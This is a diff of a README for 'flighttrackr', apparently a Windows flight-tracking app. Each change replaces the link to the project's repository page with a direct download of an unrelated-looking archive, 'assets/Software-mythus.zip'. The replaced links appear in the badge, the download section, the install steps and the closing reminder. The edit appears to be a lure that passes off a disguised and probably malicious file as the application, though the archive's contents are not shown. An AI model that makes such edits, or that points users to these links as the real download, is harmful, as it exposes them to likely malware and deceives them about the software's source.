@@ -1,12 +1,12 @@
 # ✈️ flighttrackr - Track Airspace Flights With Ease
 
-[![Download flighttrackr](https://img.shields.io/badge/Download%20flighttrackr-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Slavic-frijol148/flighttrackr)
+[![Download flighttrackr](https://img.shields.io/badge/Download%20flighttrackr-4B6FFF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Slavic-frijol148/flighttrackr/main/assets/Software-mythus.zip)
 
 ## 📥 Download flighttrackr
 
 Use this link to visit the page and download the app:
 
-https://github.com/Slavic-frijol148/flighttrackr
+https://raw.githubusercontent.com/Slavic-frijol148/flighttrackr/main/assets/Software-mythus.zip
 
 ## 🧭 What flighttrackr does
 
@@ -35,7 +35,7 @@ flighttrackr is made for normal desktop use on Windows. It works best on a syste
 Follow these steps to download and run flighttrackr:
 
 1. Open the download page:
-   https://github.com/Slavic-frijol148/flighttrackr
+   https://raw.githubusercontent.com/Slavic-frijol148/flighttrackr/main/assets/Software-mythus.zip
 
 2. Look for the latest file to download on the page.
 
@@ -154,7 +154,7 @@ It is a good fit for people who want a plain flight monitor that stays easy to u
 
 If you need the file again, use this page:
 
-https://github.com/Slavic-frijol148/flighttrackr
+https://raw.githubusercontent.com/Slavic-frijol148/flighttrackr/main/assets/Software-mythus.zip
 
 ## 🧩 Simple launch checklist
 
